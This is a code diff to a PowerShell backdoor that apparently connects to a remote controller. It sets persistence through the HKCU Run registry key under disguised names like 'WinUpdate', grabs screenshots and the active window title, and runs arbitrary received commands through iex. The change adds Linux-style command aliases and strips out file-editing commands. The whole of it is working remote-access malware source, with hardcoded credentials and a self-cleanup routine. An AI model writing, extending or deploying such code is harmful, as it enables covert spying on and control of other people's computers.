@@ -5,6 +5,26 @@ $pass = 'biskviti'
 $user = "B15cu1t"
 $reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
+# LINUX ALIASES (runs through your existing timeout system)
+$LinuxAliases = @{
+    'ls' = 'dir'
+    'll' = 'dir /a'
+    'la' = 'dir /a'
+    'cd' = 'cd'
+    'pwd' = 'pwd'
+    'cat' = 'type'
+    'touch' = 'New-Item -ItemType File'
+    'rm' = 'Remove-Item -Force'
+    'mkdir' = 'mkdir'
+    'cp' = 'copy'
+    'mv' = 'move'
+    'ps' = 'Get-Process'
+    'whoami' = 'whoami'
+    'id' = 'whoami'
+    'df' = 'Get-PSDrive'
+    'top' = 'Get-Process | Sort-Object CPU -Descending | Select -First 10'
+}
+
 # Function to grab the Foreground Window Title
 function Get-ActiveWin {
     $code = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);'
@@ -45,12 +65,11 @@ try {
 
             if ($cmd -eq "exit") { break }
             
-            # Window title
+            # NEW COMMAND: Just get the active window name
             elseif ($cmd -eq "window") {
                 $w.WriteLine("[ACTIVE]: " + (Get-ActiveWin))
             }
 
-            # Screenshot
             elseif ($cmd -eq "screenshot") {
                 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                 $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
@@ -62,60 +81,7 @@ try {
                 $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                 $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
             }
-
-            # FILE OPERATIONS
-            elseif ($cmd -eq "touch") {
-                $filename = $r.ReadLine().Trim()
-                New-Item -ItemType File -Path $filename -Force | Out-Null
-                $w.WriteLine("[+] Created: $filename")
-            }
             
-            elseif ($cmd -eq "nano" -or $cmd -eq "edit") {
-                $filename = $r.ReadLine().Trim()
-                if (Test-Path $filename) {
-                    $content = Get-Content $filename -Raw -Encoding UTF8
-                } else {
-                    $content = ""
-                    New-Item -ItemType File -Path $filename -Force | Out-Null
-                }
-                $w.WriteLine("=== $filename ===")
-                $w.WriteLine($content)
-                $w.WriteLine("--- Send new content ('.' on blank line to save) ---")
-                
-                $newContent = @()
-                while($true) {
-                    $line = $r.ReadLine()
-                    if ($line.Trim() -eq ".") { break }
-                    $newContent += $line
-                }
-                
-                $newContent -join "`r`n" | Set-Content $filename -Encoding UTF8
-                $w.WriteLine("[+] Saved: $filename")
-            }
-            
-            elseif ($cmd -match "^append\s+(.*)") {
-                $filename = $matches[1]
-                $w.WriteLine("[APPEND] Enter content for $filename ('.' to finish):")
-                $content = @()
-                while($true) {
-                    $line = $r.ReadLine()
-                    if ($line.Trim() -eq ".") { break }
-                    $content += $line
-                }
-                $content -join "`r`n" | Add-Content $filename -Encoding UTF8
-                $w.WriteLine("[+] Appended to: $filename")
-            }
-            
-            elseif ($cmd -match "^cat\s+(.*)") {
-                $filename = $matches[1]
-                if (Test-Path $filename) {
-                    Get-Content $filename -Encoding UTF8 | % { $w.WriteLine($_) }
-                } else {
-                    $w.WriteLine("[-] File not found: $filename")
-                }
-            }
-
-            # Cleanup
             elseif ($cmd -eq "kill") {
                 "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
                     $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
@@ -124,24 +90,17 @@ try {
                 $w.WriteLine("[!] Cleanup Complete."); $c.Close(); Stop-Process -Id $PID -Force 
             }
             
-            # TIMEOUT EXECUTION (for everything else)
+            # TIMEOUT EXECUTION WITH LINUX ALIASES
             else { 
-                $job = Start-Job -ScriptBlock { 
-                    param($cmd) 
-                    try { 
-                        $result = iex $cmd 2>&1 | Out-String 
-                        if ([string]::IsNullOrEmpty($result.Trim())) { "[-] No output" } 
-                        else { $result } 
-                    } catch { 
-                        "ERROR: $_" 
-                    } 
-                } -ArgumentList $cmd
-                
-                if (Wait-Job $job -Timeout 10) {
+                # Translate Linux commands
+                $translatedCmd = $LinuxAliases[$cmd] ?? $cmd
+                $job = Start-Job -ScriptBlock { param($c) iex $using:translatedCmd 2>&1 | Out-String } -ArgumentList $translatedCmd
+                $timeout = 10
+                if (Wait-Job $job -Timeout $timeout) {
                     Receive-Job $job | % { $w.WriteLine($_) }
                 } else {
-                    Stop-Job $job -Force; Remove-Job $job -Force
-                    $w.WriteLine("[!] TIMEOUT: Command took >10s")
+                    Stop-Job $job; Remove-Job $job
+                    $w.WriteLine("[!] Command timed out after 10s")
                 }
             }
         }
